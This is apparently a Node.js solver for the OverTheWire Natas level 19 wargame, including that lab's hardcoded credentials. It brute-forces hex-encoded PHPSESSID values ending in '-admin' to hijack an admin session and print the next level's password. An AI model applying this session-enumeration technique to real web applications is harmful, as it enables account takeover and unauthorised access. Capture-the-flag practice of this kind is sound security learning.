const http = require('http');
const querystring = require('querystring');
const slow = require('slow');

const submit = session =>
  new Promise((resolve, reject) => {
    const request = http.request(
      {
        auth: 'natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded',
          Cookie: `PHPSESSID=${session}`,
        },
        hostname: 'natas19.natas.labs.overthewire.org',
        method: 'POST',
        path: '/index.php?debug=1',
        port: 80,
      },
      res => {
        let body = '';
        res.on('data', data => (body = body + data));
        res.on('end', () => {
          const isAdminSession = !!body.match(/Password/);

          if (isAdminSession) {
            console.log(`Admin Session: ${session}`);

            const regex = /\n(Password: [a-zA-Z0-9]{32})<\/pre>/;
            const password = body.match(regex)[1];

            console.log(password);
          }

          resolve(!!body.match(/Password/));
        });
      },
    );

    const username = 'admin';
    const password = 'password;';

    request.on('error', e => console.log(e));
    request.write(querystring.stringify({username, password}));
    request.end();
  });

const sessions = [...new Array(641)]
  .map((_, i) => i)
  .map(session => `${session}-admin`)
  .map(session =>
    session
      .split('')
      .map(c => c.charCodeAt(0).toString(16))
      .join(''),
  );

// console.log(sessions.slice(0, 20));

slow.run(sessions, i => submit(i));
